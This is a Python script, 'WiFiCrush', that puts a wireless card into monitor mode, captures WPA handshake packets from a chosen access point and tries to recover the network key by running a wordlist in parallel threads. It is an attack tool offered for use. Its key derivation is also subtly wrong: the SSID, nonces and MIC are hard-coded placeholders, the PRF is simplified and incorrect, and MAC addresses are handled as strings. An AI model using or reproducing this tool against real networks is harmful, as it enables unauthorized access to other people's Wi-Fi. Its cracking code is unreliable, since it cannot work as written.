#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import *
import hashlib
import hmac
import binascii

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('wificrush.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class WiFiCrush:
    def __init__(self, interface: str, bssid: str, wordlist: str, capture_file: str = None, 
                 threads: int = 5, quiet: bool = False):
        self.interface = interface
        self.bssid = bssid
        self.wordlist = wordlist
        self.capture_file = capture_file
        self.threads = threads
        self.quiet = quiet
        self.output_dir = 'wificrush-output'
        self.output_file = os.path.join(self.output_dir, 
            f"crack_{bssid.replace(':', '')}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"crack_{bssid.replace(':', '')}_{time.strftime('%Y%m%d_%H%M%S')}.json")
        os.makedirs(self.output_dir, exist_ok=True)
        self.results = []
        self.handshake = None
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('wificrush.log')]

    def validate_inputs(self) -> bool:
        """Validate input parameters."""
        if not os.path.isfile(self.wordlist):
            logger.error(f"Wordlist file not found: {self.wordlist}")
            return False
        try:
            subprocess.check_call(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.check_call(['airmon-ng', 'start', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            logger.error(f"Failed to set interface {self.interface} to monitor mode")
            return False
        return True

    def capture_handshake(self):
        """Capture WPA/WPA2 handshake packets."""
        logger.info(f"Starting packet capture on {self.interface} for BSSID {self.bssid}")
        self.handshake = None
        output_pcap = self.capture_file or os.path.join(self.output_dir, f"capture_{time.strftime('%Y%m%d_%H%M%S')}.pcap")

        def packet_handler(pkt):
            if pkt.haslayer(Dot11) and pkt[Dot11].addr2 == self.bssid.lower():
                if pkt.haslayer(EAPOL):
                    logger.info("WPA handshake packet captured")
                    self.handshake = pkt
                    wrpcap(output_pcap, pkt, append=True)
                    return True
            return False

        try:
            sniff(iface=self.interface, prn=packet_handler, store=0, timeout=60)
        except Exception as e:
            logger.error(f"Error capturing packets: {e}")

        if not self.handshake:
            logger.error("No WPA handshake captured")
            sys.exit(1)
        logger.info(f"Handshake saved to {output_pcap}")
        return output_pcap

    def load_handshake(self):
        """Load handshake from existing capture file."""
        if not self.capture_file or not os.path.isfile(self.capture_file):
            logger.error(f"Capture file not found: {self.capture_file}")
            sys.exit(1)
        try:
            packets = rdpcap(self.capture_file)
            for pkt in packets:
                if pkt.haslayer(EAPOL):
                    self.handshake = pkt
                    logger.info(f"Loaded WPA handshake from {self.capture_file}")
                    return
            logger.error("No WPA handshake found in capture file")
            sys.exit(1)
        except Exception as e:
            logger.error(f"Error reading capture file: {e}")
            sys.exit(1)

    def crack_wpa(self, password: str, ssid: str, anonce: bytes, snonce: bytes, 
                  mic: bytes, eapol: bytes) -> bool:
        """Attempt to crack WPA PSK using a password."""
        try:
            # Simplified WPA key derivation (PMK and PTK)
            pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
            ptk = self.prf(pmk, anonce, snonce, self.bssid.lower().encode(), self.handshake[Dot11].addr1.lower().encode())
            computed_mic = hmac.new(ptk[:16], eapol, hashlib.sha1).digest()[:16]
            return computed_mic == mic
        except Exception:
            return False

    def prf(self, pmk: bytes, anonce: bytes, snonce: bytes, ap_mac: bytes, sta_mac: bytes) -> bytes:
        """Pseudo-random function for PTK derivation."""
        data = b''.join([min(ap_mac, sta_mac), max(ap_mac, sta_mac), 
                         min(anonce, snonce), max(anonce, snonce)])
        return hmac.new(pmk, b"Pairwise key expansion" + data, hashlib.sha1).digest()

    def attempt_crack(self, password: str, ssid: str, anonce: bytes, snonce: bytes, 
                      mic: bytes, eapol: bytes) -> dict:
        """Attempt to crack WPA key with a password."""
        result = {'password': password, 'status': 'failed', 'message': ''}
        if self.crack_wpa(password, ssid, anonce, snonce, mic, eapol):
            result['status'] = 'success'
            result['message'] = f"WPA key found: {password}"
            self.results.append(result['message'])
            logger.info(result['message'])
        return result

    def run(self):
        """Run WiFiCrush to capture and crack WPA keys."""
        if not self.validate_inputs():
            sys.exit(1)

        logger.info(f"Starting WiFiCrush on interface {self.interface}, BSSID: {self.bssid}")

        # Capture or load handshake
        if self.capture_file:
            self.load_handshake()
        else:
            self.capture_file = self.capture_handshake()

        # Extract handshake data (simplified)
        ssid = "test_network"  # Replace with actual SSID from beacon frames
        anonce = b'\x00' * 32  # Placeholder: Extract from handshake
        snonce = b'\x00' * 32  # Placeholder
        mic = b'\x00' * 16     # Placeholder
        eapol = b''            # Placeholder

        # Load wordlist
        try:
            with open(self.wordlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error reading wordlist: {e}")
            sys.exit(1)

        logger.info(f"Cracking WPA key with {len(passwords)} passwords")
        json_results = []

        # Crack using thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self.attempt_crack, password, ssid, anonce, snonce, mic, eapol)
                for password in passwords
            ]
            for future in as_completed(futures):
                json_results.append(future.result())

        # Save results
        with open(self.output_file, 'a') as f:
            for result in self.results:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {result}\n")
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Crack attempt complete\n")

        with open(self.json_file, 'w') as f:
            json.dump({
                "interface": self.interface,
                "bssid": self.bssid,
                "capture_file": self.capture_file,
                "results": json_results,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)

        logger.info(f"Crack attempt complete. Results saved to {self.output_file} and {self.json_file}")

        # Stop monitor mode
        subprocess.check_call(['airmon-ng', 'stop', f"{self.interface}mon"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    parser = argparse.ArgumentParser(
        description="WiFiCrush: A Wi-Fi security testing tool.",
        epilog="Example: ./wificrush.py -i wlan0 -b 00:14:22:01:23:45 -w passwords.txt -T 5"
    )
    parser.add_argument('-i', '--interface', required=True, 
                       help="Wireless interface (e.g., wlan0)")
    parser.add_argument('-b', '--bssid', required=True, 
                       help="Target BSSID (e.g., 00:14:22:01:23:45)")
    parser.add_argument('-w', '--wordlist', default='/usr/share/wordlists/passwords.txt', 
                       help="Wordlist file (default: /usr/share/wordlists/passwords.txt)")
    parser.add_argument('-c', '--capture-file', 
                       help="Existing capture file with WPA handshake")
    parser.add_argument('-T', '--threads', type=int, default=5, 
                       help="Number of threads (default: 5)")
    parser.add_argument('-q', '--quiet', action='store_true', 
                       help="Quiet mode (log to file only)")

    args = parser.parse_args()

    print("""
    ==============================
         WiFiCrush v1.0
      Wi-Fi Security Testing
    ==============================
    """)

    try:
        crusher = WiFiCrush(
            interface=args.interface,
            bssid=args.bssid,
            wordlist=args.wordlist,
            capture_file=args.capture_file,
            threads=args.threads,
            quiet=args.quiet
        )
        crusher.run()
    except KeyboardInterrupt:
        logger.info("WiFiCrush interrupted by user")
        subprocess.check_call(['airmon-ng', 'stop', f"{args.interface}mon"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        subprocess.check_call(['airmon-ng', 'stop', f"{args.interface}mon"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        sys.exit(1)

if __name__ == "__main__":
    main()